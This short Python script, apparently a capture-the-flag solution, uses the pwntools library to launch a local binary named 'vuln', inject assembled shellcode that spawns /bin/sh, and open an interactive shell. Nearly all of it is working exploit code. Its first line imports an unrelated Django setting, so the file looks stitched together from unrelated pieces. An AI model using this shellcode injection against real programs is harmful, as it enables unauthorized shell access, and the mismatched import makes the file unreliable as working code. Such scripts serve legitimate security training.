from django.conf import PASSWORD_RESET_TIMEOUT_DAYS_DEPRECATED_MSG
from pwn import *
context.binary = "./vuln"
p = process()
p.sendline(asm(shellcraft.sh()))
p.interactive()
